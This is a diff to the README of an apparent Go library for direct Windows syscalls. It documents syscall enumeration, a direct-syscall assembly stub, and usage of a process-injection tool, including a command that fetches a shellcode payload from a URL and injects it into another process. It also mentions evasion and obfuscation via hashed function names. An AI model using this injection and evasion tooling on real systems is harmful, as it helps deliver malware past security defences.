@@ -109,6 +109,135 @@ Get the syscall number for debugging purposes.
 #### `GetFunctionHash(functionName string) uint32`
 Get the hash of a function name for obfuscation.
 
+#### `DumpAllSyscalls() ([]SyscallInfo, error)`
+Enumerate and dump all available syscalls from ntdll.dll with their syscall numbers, hashes, and addresses.
+
+## Syscall Discovery & Analysis
+
+###  DumpAllSyscalls Feature
+
+The library includes a powerful syscall enumeration feature that can discover and analyze all available Windows syscalls on the current system. This is invaluable for research, debugging, and understanding the Windows API landscape.
+
+#### Command Line Usage
+
+```bash
+# Dump all syscalls to console and JSON file
+./cmd.exe -dump
+```
+
+#### Console Output
+```
+Dumping all available syscalls from ntdll.dll...
+================================================================================
+Found 450 syscall functions:
+
+SSN  Function Name                            Hash         Address         
+---  ---------------------------------------- ------------ ----------------
+1    NtAcceptConnectPort                      0x12345678   0x7FF812340000  
+2    NtAccessCheck                            0x23456789   0x7FF812340100  
+24   NtAllocateVirtualMemory                  0xF783B8EC   0x7FF87D38D7E0
+24   ZwAllocateVirtualMemory                  0xB20C09DB   0x7FF87D38D7E0
+...
+
+Total syscalls found: 450
+✓ Syscall dump saved to: syscall_dump_20240101_143022.json
+✓ File size: 125.67 KB
+```
+
+#### JSON Export Structure
+
+The dump automatically generates a timestamped JSON file with complete syscall information:
+
+```json
+{
+  "timestamp": "2024-01-01T14:30:22-05:00",
+  "system_info": {
+    "os": "Windows",
+    "architecture": "x64",
+    "ntdll_base": "0x7FF87D340000"
+  },
+  "syscalls": [
+    {
+      "Name": "NtAllocateVirtualMemory",
+      "Hash": 4158893292,
+      "SyscallNumber": 24,
+      "Address": 140702076348384
+    },
+    {
+      "Name": "ZwAllocateVirtualMemory", 
+      "Hash": 2987461339,
+      "SyscallNumber": 24,
+      "Address": 140702076348384
+    }
+  ],
+  "total_count": 450
+}
+```
+
+#### Using DumpAllSyscalls Programmatically
+
+```go
+package main
+
+import (
+    "fmt"
+    "log"
+    
+    winapi "github.com/carved4/go-direct-syscall"
+)
+
+func main() {
+    // Dump all syscalls
+    syscalls, err := winapi.DumpAllSyscalls()
+    if err != nil {
+        log.Fatal("Failed to dump syscalls:", err)
+    }
+    
+    fmt.Printf("Found %d syscalls\n", len(syscalls))
+    
+    // Find specific syscalls
+    for _, sc := range syscalls {
+        if sc.Name == "NtAllocateVirtualMemory" {
+            fmt.Printf("Found NtAllocateVirtualMemory:\n")
+            fmt.Printf("  SSN: %d\n", sc.SyscallNumber)
+            fmt.Printf("  Hash: 0x%X\n", sc.Hash)
+            fmt.Printf("  Address: 0x%X\n", sc.Address)
+        }
+    }
+}
+```
+
+#### Key Features
+
+- **Complete Discovery**: Finds all Nt*/Zw* syscall functions in ntdll.dll
+- **Rich Metadata**: Syscall numbers, function hashes, and memory addresses
+- **Persistent Storage**: Automatic JSON export with timestamps
+- **Duplicate Detection**: Shows Nt*/Zw* function pairs with same syscall numbers
+- **Analysis Ready**: Structured data perfect for research and automation
+- **Research Friendly**: Includes system context and metadata
+
+#### Use Cases
+
+**Security Research**
+- Map the complete Windows syscall landscape
+- Track syscall changes across Windows versions
+- Identify new or modified syscalls in updates
+
+**Malware Analysis**
+- Understand available syscalls for evasion techniques
+- Pre-compute function hashes for obfuscation
+- Analyze syscall usage patterns
+
+**System Administration**
+- Audit available system calls
+- Compare syscalls across different systems
+- Generate reference documentation
+
+**Development & Debugging**
+- Verify syscall resolution is working correctly
+- Debug hash collisions or resolution issues
+- Understand the true Windows API surface
+
 ## Build Requirements
 
 ### Prerequisites
@@ -171,20 +300,33 @@ global do_syscall
 section .text
 
 do_syscall:
-    mov [rsp - 0x8],  rsi    ; Save registers
+    mov [rsp - 0x8],  rsi
     mov [rsp - 0x10], rdi
 
-    mov eax, ecx             ; Syscall number
-    mov rcx, rdx             ; First argument
-    mov r10, r8              ; Third argument (syscall convention)
-    mov rdx, r9              ; Second argument
+    mov eax, ecx
+    mov rcx, rdx
 
-    ; Handle additional arguments...
-    syscall                  ; Execute direct syscall
-    
-    mov rsi, [rsp - 0x8]     ; Restore registers
+    mov r10, r8
+    mov rdx, r9
+
+    mov  r8,  [rsp + 0x28]
+    mov  r9,  [rsp + 0x30]
+
+    sub rcx, 0x4
+    jle skip
+
+    lea rsi,  [rsp + 0x38]
+    lea rdi,  [rsp + 0x28]
+
+    rep movsq
+skip:
+    syscall
+
+    mov rsi, [rsp - 0x8]
     mov rdi, [rsp - 0x10]
-    ret
+
+    ret 
+
 ```
 
 ## Use Cases
@@ -486,9 +628,16 @@ cd go-direct-syscalls
 
 bash build.sh
 
+# Dump all syscalls (no injection, safe for analysis)
+./cmd.exe -dump
+
+# Run example injection with embedded calc shellcode
 ./cmd.exe -example 
 
-# this will  run the main program to list injectible processes, and prompt for a selection
+# Run injection with custom payload from URL
+./cmd.exe -url http://example.com/payload.bin
+
+# this will run the main program to list injectible processes, and prompt for a selection
 # the shellcode you're injecting is a simple pop calc shellcode, obviously be smart about running shellcode from github repos
 # so feel free to use donut or msfvenom or similar to generate your own calc shellcode and replace GetEmbeddedShellcode func
 
